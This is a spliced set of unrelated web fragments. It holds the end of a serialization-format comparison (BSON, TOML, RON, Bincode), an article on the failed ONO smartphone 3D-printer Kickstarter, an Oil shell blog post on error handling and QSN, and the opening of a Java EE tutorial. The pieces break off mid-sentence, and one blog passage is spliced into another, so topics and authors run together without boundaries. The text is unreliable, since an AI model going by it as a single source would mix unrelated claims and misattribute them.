<p>The Other CBOR, or rather, <a href="https://news.ycombinator.com/item?id=14067747">CBOR is derived from this</a>. Designed to be simple and compact. Kinda a <em>lot</em> like a slightly chopped down CBOR, actually, their integer specification stuff looks nearly identical.</p>
<p><strong>Category:</strong> Machine-readable, self-describing.</p>
<p><strong>Users:</strong> Redis, a few others?</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Simple</li>
<li>Compact</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Specification is kinda weak</li>
<li>No real tuple or enum types</li>
<li>Why not just CBOR?</li>
</ul>
<h2 id="bson">BSON</h2>
<p><a href="http://bsonspec.org/">http://bsonspec.org/</a></p>
<p>As the name implies, a binary-ifcation of JSON. Created by MongoDB as its internal data format.</p>
<p><strong>Category:</strong> Machine-readable, self-describing.</p>
<p><strong>Users:</strong> MongoDB</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Type system is full of deprecated and MongoDB-specific shit but is reasonably pragmatic</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Type system is reasonably pragmatic but is full of deprecated and MongoDB-specific shit</li>
<li><strong>C strings</strong> – though there’s random non-C strings in places as well.</li>
<li>Its arrays are a travesty against serializarion</li>
<li>Basically an implementation detail of MongoDB, and it looks like it</li>
</ul>

<p>Things that are interesting but not actually in the scope of serialization languages, or are otherwise irrelevant.</p>
<h2 id="toml">TOML</h2>
<p><a href="https://github.com/toml-lang/toml">https://github.com/toml-lang/toml</a></p>
<p>Invalid, it’s designed as a config language, not a serialization format. It’s basically an attempt to make something as simple and ubiquitous as windows .INI files that is an actual specification rather than a fashion.</p>
<p><strong>Category:</strong> Human-readable, sorta self-describing though usually you have a specific data structure you’re trying to fit it into.</p>
<p><strong>Users:</strong> Various, notably Cargo (Rust’s build tool)</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Work well as a config language without deeply nested structures</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Works poorly when you try to make deeply nested structures</li>
</ul>
<h2 id="ron">RON</h2>
<p><a href="https://github.com/ron-rs/ron">https://github.com/ron-rs/ron</a></p>
<p>Rusty Object Notation. Because shoehorning Rust’s ML-y type systeminto JSON isn’t very much fun. Works startlingly well for this purpose but is basically untried elsewhere.</p>
<p><strong>Category:</strong> Human-readable, sorta self-describing though usually you have a specific data structure you’re trying to fit it into.</p>
<p><strong>Users:</strong> A few, notably <a href="https://amethyst.rs/">Amethyst</a>.</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Good type system for sophisticated functional-style languages</li>
<li>Simple and reasonably compact</li>
<li>Actually very good at what it does</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Young, underspecified, Rust-centric</li>
</ul>
<h2 id="bincode">Bincode</h2>
<p><a href="https://github.com/servo/bincode">https://github.com/servo/bincode</a></p>
<p>Included mainly for completeness. It’s not standardized outside of a single particular implementation which doesn’t promise stability, so not intended for general-purpose use. It’s intended as a fast and easy RPC/IPC format for Servo, and the actual format is basically an implementation detail of that goal.</p>
<p><strong>Users:</strong> Servo, programs written by introverts who don’t care about being able to talk to each other. (Turns out this is a useful niche though, who knew.)</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Compact, fast, simple.</li>
<li>Works basically transparently for IPC with Rust code.</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Anything other than that specific version of that specific library is …</li></ul></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Following on from the 2013 to 2014 boom, optimism in the 3D printing industry in early 2016 was rife, and backers were clamoring to support Kickstarter projects claiming to revolutionize the sector. Many fledgling Kickstarter projects became extraordinarily successful. Formlabs even went unicorn.<span data-ez-name="3dsourced_com-box-3"></span></p><p>But some projects bordered into naïve, buoyed by fashionable buzzwords and heavily padded announcement videos. Several projects raised over a million dollars, sometimes based only on ambitious – perhaps far-fetched – targets and little evidence of feasibility, and as the months drew on, never even produced a final product for backers to be disappointed with.</p><p>One project however stands head and shoulders above others for its disaster: in magnitude of failure; amount of money lost; and emotional turmoil. It has been called the biggest 3D printing scam of all time, taking $2.3 million from 16,180 backers. For the next four years, they relentlessly teased supporters that they were days from receiving their printer, just to let them down again.<span data-ez-name="3dsourced_com-medrectangle-3"></span></p><p>Here’s how it unfolded. This is the story of the ONO.</p><h2><span id="OLO_The_first_days"></span>OLO: The first days<span></span></h2><p>The OLO 3D printer <a href="https://www.kickstarter.com/projects/olo3d/olo-the-first-ever-smartphone-3d-printer" target="_blank" rel="noreferrer noopener">campaign</a> went live on Kickstarter on March 21<sup>st</sup>, 2016, promising a $99 <a rel="noreferrer noopener" href="https://3dsourced.com/3d-printers/resin-dlp-sla-3d-printer-stereolithography/" target="_blank">resin 3D printer</a> that used your smartphone screen’s light to solidify resin and create a finished model. Back in 2016 resin 3D printers started at a few thousand dollars, and even in the present day $99 is absurdly cheap – but OLO said they could do it for less than $100.</p><p>Normal resin printers use a powerful light source to cure and solidify resin. Instead of using standard UV resins, OLO’s phone printer system used a daylight-sensitive resin that your phone screen’s comparatively weak light source could still polymerize. The tech made sense in theory, and if perfected anyone with a smartphone could 3D print. OLO made 3D printing accessible, and at the lowest prices the world had ever seen.</p><p>The world noticed. OLO targeted $80,000 to make the project a reality and deliver the technology to market. Kickstarter campaigns run for 30 days, OLO hit their target in 33 minutes. The project was a roaring success.</p><h2><span id="The_First_Cracks"></span>The First Cracks<span></span></h2><p>Some were still sceptical amidst the hype and optimism. Angus Deveson, better known as Maker’s Muse, was unconvinced. As the campaign hit $1M in funding, he posted a video outlining his concerns about the project’s feasibility.<span data-ez-name="3dsourced_com-large-leaderboard-2"></span></p><p>Firstly, the resins. Low cost resin printers at the time often used DLP technology – <a href="https://3dsourced.com/3d-printing-technologies/digital-light-processing-dlp/" target="_blank" rel="noreferrer noopener">Digital Light Processing</a> – a technology also used in cinema projectors. The light source used is immensely powerful as to cure photo-sensitive resin, and exponentially more powerful than a smartphone’s screen.</p><p>Using your smartphone’s comparatively weak light source, prints could take a whole day – possibly longer than your phone’s battery life. This is time where you cannot even look at your phone, never mind use it. Could people handle that level of inconvenience?</p><p>Additionally, the OLO Kickstarter video and photos shows clear resin bottles for their daylight-sensitive resins, which would cause the resin to instantly cure and harden in the bottle far before you could print with it. Resins are always packed into matte black containers to avoid this.</p><figure><img loading="lazy" width="700" height="400" src="https://i0.wp.com/3dsourced.com/wp-content/uploads/2020/06/ONO-Clear-Resin-Bottles.jpg?resize=700%2C400&amp;ssl=1" alt="ono clear resin bottles" srcset="https://i0.wp.com/3dsourced.com/wp-content/uploads/2020/06/ONO-Clear-Resin-Bottles.jpg?w=700&amp;ssl=1 700w, https://i0.wp.com/3dsourced.com/wp-content/uploads/2020/06/ONO-Clear-Resin-Bottles.jpg?resize=300%2C171&amp;ssl=1 300w" sizes="(max-width: 700px) 100vw, 700px" data-recalc-dims="1"><figcaption>OLO original Kickstarter image, with clear resin bottles.</figcaption></figure><p>Most dangerously, Maker’s Muse highlighted the blatant safety errors in the video: resins are harmful and should not be handled without gloves and goggles, and not just washed in water as the video demonstrated.</p><p>In a grimly prophetic statement in his 27<sup>th</sup> March 2016 video discussing the project, Angus surmised that he felt OLO was a world away from being production ready: <em>‘You may be waiting a very long time to get this project.’</em> The campaign was only six days old.</p><h2><span id="Fake_it_till_you_make_it"></span>Fake it till you make it?<span></span></h2><p>It is unofficially accepted that for many technology campaigns on Kickstarter, creative liberties are taken to show supposed market-ready prototypes. This is not necessarily bad, executing a precocious vision is requisite for greatness, and it is difficult to get people excited about a project if you do not have the funds to create said exciting project. Therefore, companies seeking investment tell white lies, show what the product will look like post-investment, rather than how it is now.</p><p>Many of the 16,000 backers were aware they were bridging the gap between vision and reality with their support. So, when Maker’s Muse pointed out that many of the objects shown in their campaign were clearly laser cut rather than printed on their machines, it did not cause the outrage that perhaps it should have. Slick marketing blurred the lines between fantasy and falsity, between hype and fraud.</p><p>One thing deducible from the laser cut parts was that OLO was not a working prototype. The parts the OLO team said their machines had printed were assuredly not printed by those machines. The question was not whether they did print those models, but whether they ever could.</p><figure><img loading="lazy" width="800" height="400" src="https://i2.wp.com/3dsourced.com/wp-content/uploads/2020/06/Laser-Cut-Part.jpg?resize=800%2C400&amp;ssl=1" alt="ono 3d printer parts that appear to be laser cut" srcset="https://i2.wp.com/3dsourced.com/wp-content/uploads/2020/06/Laser-Cut-Part.jpg?w=800&amp;ssl=1 800w, https://i2.wp.com/3dsourced.com/wp-content/uploads/2020/06/Laser-Cut-Part.jpg?resize=300%2C150&amp;ssl=1 300w, https://i2.wp.com/3dsourced.com/wp-content/uploads/2020/06/Laser-Cut-Part.jpg?resize=768%2C384&amp;ssl=1 768w" sizes="(max-width: 800px) 100vw, 800px" data-recalc-dims="1"><figcaption>This part looks laser cut rather than 3D printed, as echoed by Maker’s Muse.</figcaption></figure><p>Though in the Kickstarter campaign it was claimed to be a San Francisco-based project, OLO’s founders are in fact Italian. The two founders, Filippo Moroni and Pietro Gabriele, claim to have 15 years’ experience in the 3D printing industry in a company called Solido3D, as well as founding a 3D printing network called Fonderie Digitali. While on face value this adds prestige, further research unveils red flags.</p><h2><span id="From_OLO_to_ONO_to_Oh_No"></span>From OLO to ONO to Oh No<span></span></h2><p>Following the successful campaign, patrons waited excitedly for their OLO printers, having been promised delivery within a few short months. A few months later, on August 29<sup>th</sup>, 2016, OLO posted an update detailing how a similar-named company had contacted them with their grievances, and that therefore they were changing their name from OLO to ONO. This was perhaps symbolic for the four following years.</p><p>Resin 3D printers use a print bed which, upon finishing each solidified layer of resin, descends a small amount so that the next layer of liquid resin can be solidified. OLO’s original design controlled the print bed by plugging into your smartphone’s headphone jack and sending audio signals that act as directions, communicating when to move the print bed as each layer finishes. Many felt this was unnecessarily complicated and they should just use a Bluetooth method, but they pressed on with the headphone jack plan. It had already delayed the printer’s release due to issues with some phones having headphone jacks on top, while some had them on the bottom.</p><p>However, as they scrambled to fix these issues, phones were beginning to cut the headphone jack out entirely. The iPhone 7 released in September 2016, the highest profile of early phones to ditch the headphone jack. Suddenly all ONO’s planning was obsolete. A Bluetooth device was eventually decided on. </p><p>On March 22nd 2017, almost nine months after the original shipping date, ONO announced they would start shipping units the following day, on the 23rd. However, after going silent they eventually posted an update on April 10th discussing a last-minute issue with their electrical boards. The ordeal meant that a year after their promised delivery date, no printers were arriving on any backers’ doorsteps.</p><figure><img loading="lazy" width="700" height="450" src="https://i1.wp.com/3dsourced.com/wp-content/uploads/2020/06/ONO-Factory-in-CHina.jpg?resize=700%2C450&amp;ssl=1" alt="ono 3d printer china factory" srcset="https://i1.wp.com/3dsourced.com/wp-content/uploads/2020/06/ONO-Factory-in-CHina.jpg?w=700&amp;ssl=1 700w, https://i1.wp.com/3dsourced.com/wp-content/uploads/2020/06/ONO-Factory-in-CHina.jpg?resize=300%2C193&amp;ssl=1 300w" sizes="(max-width: 700px) 100vw, 700px" data-recalc-dims="1"><figcaption>To reassure backers, pictures such as this one were posted showing their production facility in China, producing units.</figcaption></figure><p>Take a deeper dive into the OLO team’s claims and some interesting information arises. Regarding the claim that the founders have 15 years’ experience in 3D printing, in another interview Filippo says he himself has 15 years, while Pietro was new to the 3D printing industry, his previous business experience concerns running a jazz club.</p><p>On further inspection of Fonderie Digitali, most of the companies the team claimed to comprise the Fonderie Digitali in their email sent to Maker’s Muse network are now defunct, and were already defunct in 2016 when they sent the email. On visiting the website now, none of these other companies are mentioned, only Solido3D and ONO. It does not appear to be a network, but an extra brand name to promote the team’s existing enterprises. The only legitimate, active company claimed in the 2016 email to comprise Fonderie Digitali was WASP, known for making <a href="https://3dsourced.com/3d-printers/delta-3d-printer/" target="_blank" rel="noreferrer noopener">delta 3D printers</a> that print extraordinarily fast, as well as for ceramic printing. WASP no longer feature in any part of the Fonderie Digitali website or contacts list.</p><p>On ONO Founder Filippo Moroni’s LinkedIn page, Solido3D and Fonderie Digitali are absent. In fact, despite claiming to have 15 years’ experience 3D printing, his LinkedIn employment history is non-existent between graduating from the Politecnico di Milano in 2002 and founding OLO in 2015. It is therefore impossible to verify any job history or experience when, according to his LinkedIn, he has never worked.</p><figure><div></div></figure><p>Suddenly, at New York Maker Faire 2017, 3D printing YouTuber Joel Telling – also known as 3D Printing Nerd – posted a video on October 1<sup>st</sup> titled “ONO Resin 3D Printer – Working!” with a member of ONO’s team, exclaiming he had seen a working prototype. Joel Telling’s reputation for honesty and reluctance to promote anything sub-par to his fanbase made this all the more reassuring.</p><p>ONO cut a hole in the side of one of their printers to show footage of the actual printing process during the vlog. The time lapse showed the print process in detail — they appeared to have a working prototype. Backers were happy. Such a powerful co-sign, as well as demonstrating proof of concept, meant surely it was just a matter of time until their ONO arrived.<span data-ez-name="3dsourced_com-leader-2"></span></p><p>But then another year passed, and now two years after the original delivery date, nobody had received a printer. The controller board issues were still blamed, but even beyond this, months of updates concerned various difficulties involved in gaining the requisite certifications to ship the printers. Surely, if everything was safe and above board, this should not have taken so long.</p><h2><span id="StartEngine"></span>StartEngine<span></span></h2><p>Despite claiming they were readying to …</p></div></div>

</p>

<p>On a <a href="https://lobste.rs/s/6bphbw/fennel_programming_language_rationale">lobste.rs thread</a> about the rationale for the Fennel language, I
posted this summary of why Oil exists:</p>
<blockquote>
<p>I think these features alone would justify a new shell:</p>
<ol>
<li>Getting rid of "quoting hell"</li>
<li>Getting rid of ad hoc parsing and splitting</li>
<li>Fixing errexit</li>
</ol>
<p>But Oil has a lot more than that, including unifying separate ad hoc
expression languages ...</p>
</blockquote>
<p>This post elaborates on these points.  I've condensed the rationale into four
critical features for the <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a>.</p>
<p>I give examples of each feature, link to docs (in progress), and comment on the
future of the project.</p>
 
<a name="the-osh-language"></a>
<h2>The OSH Language</h2>
<p>Recall that <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH</a> is designed to run existing shell scripts, and
has done that <a href="http://www.oilshell.org/blog/2018/01/15.html">since early 2018</a>.</p>
<p>It also fixes warts in the shell language with <strong>opt-in</strong> features.  These are
the four most important ones.</p>
<a name="reliable-error-handling"></a>
<h3>Reliable Error Handling</h3>
<p>I just finished an overhaul of shell's flaky <code>set -e</code> / <code>errexit</code> mechanism.
I'm excited by this, because I started it last year, but put it on the back
burner after being stumped!</p>
<p>I believe I've figured out every problem now, and would like your feedback.
The simple invariant is that <strong>OSH never loses an exit code</strong>, which is not
true of POSIX shell or <a href="http://www.oilshell.org/cross-ref.html?tag=bash#bash">bash</a>.  Here's a summary of the enhancements:</p>
<ul>
<li><code>strict_errexit</code> - A shell option to <strong>detect</strong> cases where you would lose
errors in shell, like <code>if myfunc</code>.  This improves your shell scripts, even if
you run them under another shell!  In other words, OSH can be used as a dev
tool.</li>
<li><code>inherit_errexit</code> - OSH implements this bash 4.4 option, which is a partial
fix for the "command sub errexit" problem.</li>
<li><code>command_sub_errexit</code> - A shell option to check for failure at the end of
every command sub, so you don't lose errors.
<ul>
<li>This fixes the problem shown in the last panel of a <a href="https://wizardzines.com/comics/bash-functions/">recent
comic by Julia Evans</a>:
<em>"bash is weird sometimes"</em></li>
</ul>
</li>
<li><code>process_sub_fail</code> - Like <code>pipefail</code>, but for process substitutions.  It
allows <code>errexit</code> to "see" the failure caused by process subs, like the <code>sort</code>
invocation in <code>cat foo.txt &lt;(sort /oops/error)</code>,
<ul>
<li><code>@_process_sub_status</code>: A variable that's analogous to <code>${PIPESTATUS[@]}</code>.
You may want to inspect the exit status of all processes.</li>
</ul>
</li>
<li>The <code>run</code> builtin turns <code>errexit</code> back on, so <code>if run myfunc</code> is safe.  It
also provides fine-grained control over exit codes.</li>
</ul>
<p>Yes, there are many solutions, because shell has many problems!  But you don't
have to remember all these names.  Add <code>shopt --set oil:basic</code> to the top of
your program to turn all options.  The <code>strict_errexit</code> failures will remind
you to use the <code>run</code> wrapper.</p>
<p>(Aside: I was able to fix all these problems cleanly in the interpreter.  I
spent time a lot of time on <a href="https://www.oilshell.org/blog/2016/11/29.html">Oil's architecture 4 years
ago</a> precisely so I could fix
such subtle problems.  When the code has a good structure, the "right place"
for a fix reveals itself to you.  Oil is still improving!)</p>
<a name="safe-processing-of-user-supplied-data-like-filenames"></a>
<h3>Safe Processing of User-Supplied Data (like filenames)</h3>
<p><a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> is the foundation for <a href="https://github.com/oilshell/oil/wiki/Structured-Data-in-Oil">Structured Data in
Oil</a>.  It removes
the need to invent ad hoc (and often broken) formats every time you need to
deal with user-supplied data in shell.  In other words, Oil scripts have an
alternative to messy parsing and splitting.</p>
<p>I just implemented a <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> decoder, after implementing an encoder earlier
this year.</p>
<p>Here are some short examples.  The <code>write</code> builtin prints its args to stdout,
and it accepts a <code>--qsn</code> flag:</p>
<pre><code># Print filenames ONE PER LINE.  If a name contains a
# newline or other special char, it's QSN-encoded like
# 'multi-line \n name with NUL \0 byte'

write --qsn -- *.txt
</code></pre>
<p>The <code>read</code> builtin provides the inverse:</p>
<pre><code>cat list.txt | while read --line --qsn {
  # _line is implictly set by 'read'
  rm -- $_line
}
</code></pre>
<p>I also implemented <code>read -0</code> as a synonym for bash's obscure <code>read -r -d ''</code>.
This allows you to consume <code>find -print0</code> output in shell, like <code>xargs -0</code>
does.  This format is distinct from QSN, but it's now easy to convert back and
forth between them.</p>
<p>This is the first cut of <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> support.  I expect it to evolve based on your
feedback!</p>

in HTML</a> (2017).</li>
</ul>
<a name="eliminate-quoting-hell-the-qefs-problem"></a>
<h3>Eliminate Quoting Hell (the <code>!qefs</code> problem)</h3>
<p>This was done in summer 2019.  I described it in <a href="http://www.oilshell.org/release/latest/doc/simple-word-eval.html">Simple Word
Evaluation</a> earlier this year, and you can see examples in
<a href="http://www.oilshell.org/release/latest/doc/idioms.html">Oil Language Idioms</a>.</p>
<p>Briefly, Oil allows this:</p>
<pre><code>ls @myflags $filename
</code></pre>
<p>instead of</p>
<pre><code>ls "${myflags[@]}" "$filename"
</code></pre>
<p>Notice the <code>@</code> splice operator, and lack of quotes.</p>
<a name="static-parsing-enables-better-error-messages-and-tools"></a>
<h3>Static Parsing Enables Better Error Messages and Tools</h3>
<p>This blog began in 2016 with an explanation of <a href="http://www.oilshell.org/blog/2016/10/22.html">static
parsing</a>.  I didn't mention it in the comment quoted in
the intro, but it's still a crucial part of the project.</p>
<p>I was reminded how important this is when noticing that the authors of both
Perl 5 and the rc shell <a href="https://lobste.rs/s/7bpgbl/rc_plan_9_shell#c_mokqrn">made complaints about shell's dynamic
parsing</a>, going back 20-30
years!</p>
<p>This foundation is still paying dividends.  I recently used the static parser
to create detailed error messages for command subs:</p>
<pre><code><span>$</span> <span>shopt --set errexit command_sub_errexit</span>

<span>$</span> <span>d=$(date %x)</span>
date: invalid date ‘%x’
  d=$(date %x)
    ^~
[ interactive ]:13: fatal: Command sub exited with status 1 ...
</code></pre>
<p>and process subs:</p>
<pre><code><span>$</span> <span>shopt --set process_sub_fail</span>

<span>$</span> <span>cat /dev/null &lt;(sort oops)</span>
sort: cannot read: oops: No such file or directory
  cat /dev/null &lt;(sort oops)
                ^~
[ interactive ]:27: fatal: Exiting with status 2 ...
</code></pre>
<p>We point to the location of the failing construct.  No other shell does this!</p>
<p>In addition, Travis Everett has worked on a shell dependency bundler which
relies on static parsing.</p>
<ul>
<li>Related: The new <a href="http://www.oilshell.org/release/latest/doc/syntactic-concepts.html">Syntactic Concepts</a> doc lists static parsing as
one of 5 important concepts.</li>
</ul>
<a name="whats-next-for-the-project"></a>
<h2>What's Next For the Project?</h2>
<p>It was indeed useful to explicitly write out rationale for the language.  I've
done that many times with posts tagged #<a href="http://www.oilshell.org/blog/tags.html?tag=why-a-new-shell#why-a-new-shell">why-a-new-shell</a>, but
explaining it again helps, even after 4 years.  The project is evolving and
getting crisper.</p>
<a name="a-very-important-claim"></a>
<h3>A Very Important Claim</h3>
<p>With the overhaul of <code>errexit</code> and the <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> decoder, I believe we now have
all the bases for the <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a> covered!  These features
will be out with the next release.</p>
<p>The claim is that <strong>these four features alone justify a new Unix shell</strong>.  If
we finish the C++ translation, and end the project here, it would be
worthwhile.</p>
<p>To repeat, they are:</p>
<ol>
<li>Reliable error handling.  I can't recommend shell to my friends without
these fixes.</li>
<li>Safe processing of user-supplied data, i.e. an alternative to ad hoc parsing
and splitting.</li>
<li>Elimination of "quoting hell".  Let's fix it once and for all, rather than
admonishing every new shell programmer about it for the next 30 years, as
has been done for the past 30!</li>
<li>Static Parsing for better error messages and tools.  It also removes a
security issue.</li>
</ol>
<p>If you disagree, <a href="https://old.reddit.com/r/oilshell/comments/jg54gd/four_features_that_justify_a_new_unix_shell/?">let me know</a>!  I would like to hear what other
warts in the <strong>shell language</strong> need to be fixed or otherwise addressed.</p>
<p>(I'm leaving out the interactive shell here, as I believe the first priority is
a better shell for programming and automation.  A "cloud shell", if you will.)</p>
<a name="reviewing-the-biggest-cut-january-2020"></a>
<h3>Reviewing The Biggest Cut (January 2020)</h3>
<p>Back in January, I was already <strong>concerned about the scope</strong> of the project.  I
wrote that <a href="http://www.oilshell.org/blog/2020/01/ambitions.html#the-biggest-cut">the biggest cut</a> to the
project would be that Oil would be based on <strong>strings</strong>, rather than
Python-like data types.</p>
<p>Let me update that statement based on these crisp definitions:</p>
<ul>
<li>The <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a> is a compatible shell based on <strong>strings</strong>
(and arrays of strings).  Assignments look like <code>local x=mystr</code>.</li>
<li>The <a href="http://www.oilshell.org/cross-ref.html?tag=oil-language#oil-language">Oil language</a> has Python-like <strong>types and expressions</strong>.
Assignments look like <code>var x = 42 + a[i] + f(x, y)</code>.  It has a
garbage-collected heap of recursive data structures.</li>
</ul>
<p>So what I'm saying now is that the priority going forward is to
<strong>polish the OSH language</strong>, and put off the Oil language until the hazy
future.</p>
<p>That means finishing the translation to C++, hooking up the <a href="http://www.oilshell.org/blog/2020/08/risks.html#garbage-collection">garbage
collector</a>, and writing <a href="http://www.oilshell.org/release/latest/doc">documentation</a>.  It may mean preparing the code to
be embedded in another application, like the <a href="http://www.oilshell.org/cross-ref.html?tag=fish#fish">fish</a> shell.  (I've
<a href="https://github.com/oilshell/oil/wiki/Fish-Oil-Brainstorming">discussed this</a>
with the maintainer, and there's some interest.  But it's a lot of work, which
shouldn't be taken for granted, and there are unsolved problems.)</p>
<p>Achieving this OSH language milestone feels very doable, since everything
already works in Python, and something like <strong>915</strong> out of <strong>1685</strong> spec tests
pass in C++ (yielding a 30x - 50x speedup).</p>

<a name="oil-language-updates"></a>
<h3>Oil Language Updates</h3>
<p>But I'm not giving up on the Oil language!  I just need help. It exists in
prototype form, and your feedback will motivate me to work on it.</p>
<p>Here are some blog posts I want to write, to get the word out:</p>
<p><em>Four Features of the Oil Language</em>.  This post narrowed down OSH to four major
features, and Oil also has four:</p>
<ol>
<li>Python-like expressions, along with <a href="http://www.oilshell.org/release/latest/doc/eggex.html">eggexes</a></li>
<li>Ruby-like blocks, which enable DSLs and declarative configuration</li>
<li>procs (shell functions with signatures, <a href="http://www.oilshell.org/blog/tags.html?tag=shell-the-good-parts#shell-the-good-parts">which compose in unique
ways</a>)</li>
<li>Serialization formats like JSON and QTSV
(<a href="https://github.com/oilshell/oil/wiki/TSV2-Proposal">proposal</a>).  The
latter is a format for <a href="http://www.oilshell.org/blog/2018/11/30.html">typed tables</a>, built on top
of <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a>.</li>
</ol>
<p>We have working prototypes for every feature except QTSV.  You can <a href="http://oilshell.org/release/latest/">try them
now</a>!</p>
<p><em>Big Changes to the Oil Language</em>.  A list of recent changes I've made, which
should give potential contributors a feel for the language.</p>
<p><em>What Distinguishes Python, JS, and Ruby from Perl and PHP</em>.   The former
languages have a clean data model / memory model: a garbage collected heap with
reference semantics.</p>
<p>The latter languages have warts in their model.  Oil adds the clean model to
shell.</p>
<p><em>Comments on Comics</em>.  I can use these <a href="https://wizardzines.com/comics/bash-errors/">recent
comics</a> as a way to explain the
<a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a>.  (See other posts tagged #<a href="http://www.oilshell.org/blog/tags.html?tag=comic#comic">comic</a>.)</p>

<a name="summary"></a>
<h2>Summary</h2>
<p>I described 4 essential features of an improved shell language.  <a href="https://old.reddit.com/r/oilshell/comments/jg54gd/four_features_that_justify_a_new_unix_shell/?">Let me

though I still need to update it for 2021.</p>
<p>I then proposed a focus on making the OSH language "production ready".  I'm
still going to work on the Oil language, but I need help finishing it.</p>

<!-- Once Jakarta EE 9 is officially released (and WildFly 21 supports it): -->
<!-- DUPLICATE this article so you have two articles - one for Java EE and one for Jakarta EE: -->
<!-- Bring the new Jakarta EE article up to date as follows: -->
<!-- * Update all titles to: 'A Thorough Introduction to Jakarta EE (Formerly Known as Java EE) -->
<!-- * Update poster image -->

<p>The two most popular Java frameworks for server-side application development are <strong>Java EE</strong> (<em>Enterprise Edition</em>) and <strong>Spring</strong>.
Java EE is the <em>official</em> specification,
whereas Spring (unofficially) describes pretty much the same functionality,
but in many cases does so in a slightly different, often easier way.</p>
<p>(Later on, we'll go into greater detail about what the Java EE specification <em>is</em>, and what the term actually means.)</p>
<p>Should you use Java EE for your next projects, then? No, probably not.
Because what's important to know about Java EE, is that it's a comparatively heavy framework,
in terms of both setup and actually running it (in production).
The Java EE framework has greatly improved over the last decade,
but in terms of documentation, ease-of-use and operational simplicity,
it still doesn't match up against <a href="https://spring.io/projects/spring-boot">Spring Boot</a>.</p>
<p>Becoming knowledgeable in Java EE can still be worthwile, though.
For example, if you're looking to expand your software consultancy services to enterprise clients.
The <em>EE</em> part of Java EE (Enterprise Edition) is still very fitting,
as the framework is still almost exclusively used by the enterprises and BigCo's like
banks, insurance companies, government agencies, S&amp;P500, AEX, etc.</p>
<p>After a general introduction, as well as an overview of the framework's terminology,
we'll be setting up a Java EE project from scratch,
the full source code of which can be found on <a href="https://github.com/jessym/tutorials/tree/master/a-complete-introduction-to-java-ee">GitHub</a>.

<p>Java EE is a Java framework for developing server-side applications.
Among other things, it allows you to:</p>
<ul>
<li>create web APIs by accepting incoming HTTP requests</li>
<li>save and retrieve data from databases</li>
<li>send and receive messages from message brokers</li>
<li>connect to other backend systems via HTTP or SOAP</li>
<li>package applications into single units of deployment (.war files)</li>
</ul>
<p>The framework is very much geared towards enterprises and big corporations.
As such, it often ends up being popular in the domains of banking, insurance, accounting, finance, and manufacturing.</p>
<p>Like the programming language Java itself, Java EE used to be owned and managed by
<a href="https://en.wikipedia.org/wiki/Oracle_Corporation">Oracle</a>.
However, between 2017 and 2019, Oracle has transfered the ownership of the Java EE framework to the
<a href="https://en.wikipedia.org/wiki/Eclipse_Foundation">Eclipse Foundation</a>,
resulting in the framework being renamed <em>Jakarta EE</em> from version 8-9 onward.</p>

<p>It's going to take time for the term Jakarta EE to really catch on,
as the term Java EE is still very much ingrained in the corporate software industry.</p>
<p>We will be setting up a <strong>Java EE 8</strong> application in the build-along section of this article.</p>
<a href="#specifications-and-apis"><h2 id="specifications-and-apis">Specifications and APIs</h2></a>
<p>You should think of Java EE as a collection of <em>recipes</em>.
Recipes for typical pieces of functionality within a server application.
The technical term for a Java EE recipe is a <em>Java Specification Request</em> (JSR),
and each JSR describes a single unit of functionality within the Java EE framework.
For example:</p>
<ul>
<li>Creating a RESTful web API? <strong>JSR 370</strong></li>
<li>Validating incoming HTTP request bodies? <strong>JSR 380</strong></li>
<li>Connecting and reading (or writing) from a database? <strong>JSR 338</strong></li>
<li>Publishing messages to a message broker? <strong>JSR 343</strong></li>
</ul>
<p>This modular setup lets developers pick and choose which parts of the framework they want to use.</p>
<p>In an actual project, this typically means that your application has a single Maven dependency on the
<a href="https://mvnrepository.com/artifact/javax/javaee-api">full Java EE API</a>.</p>
<p>And what's interesting to understand, is that these Java EE API modules consist of nothing but interfaces, annotations and simple POJOs.
<em>There is no actual Java EE framework functionality in <strong>any</strong> of these API modules.</em>
The <em>real</em> implementation of the Java EE specifications, interfaces and annotations lies with the host environment
in which your Java application(s) will be running.
And such host environments are referred to as <strong>Java EE application servers</strong>, or simply <strong>(application) servers</strong>.</p>
<a href="#application-servers-and-implementations"><h2 id="application-servers-and-implementations">Application Servers and Implementations</h2></a>
<p>Java EE applications can't stand on their own—they require a <em>Java EE application server</em> to run in,
because the server provides the application with the facilities it needs to carry out its tasks.</p>
<p>This ties back to the story about JSRs (Java Specification Requests) from earlier.
Since your application only depends on Java EE <strong>API</strong> modules,
it's agnostic of the actual implementation of these modules (at least in theory 😅).
It's up to the application server to provide the actual (runtime) <strong>implementations</strong> to these API modules.</p>
<p><img src="https://www.jessym.com/articles/a-complete-introduction-to-java-ee/application-server.svg" alt="application server diagram with multiple deployments and multiple runtime implementation JAR files"></p>
<p>The image above should make clear that Java EE application servers are to be thought of as facilitating environments,
in which multiple (unrelated) Java apps from different teams or departments
can simaltuneously run alongside each other, each application pseudo-isolated from its neighbours.</p>
<p>An application server doesn't have to implement every single Java EE specification, though.
Different servers can have varying degrees of specification <em>compliance</em>.</p>
<p>For example, the <a href="http://tomcat.apache.org/">Apache Tomcat</a> server only implements the web layer of the
Java EE specification and, as such, is referred to as a <strong>web server</strong>.
The <a href="https://www.wildfly.org/">JBoss WildFly</a> server, on the other hand,
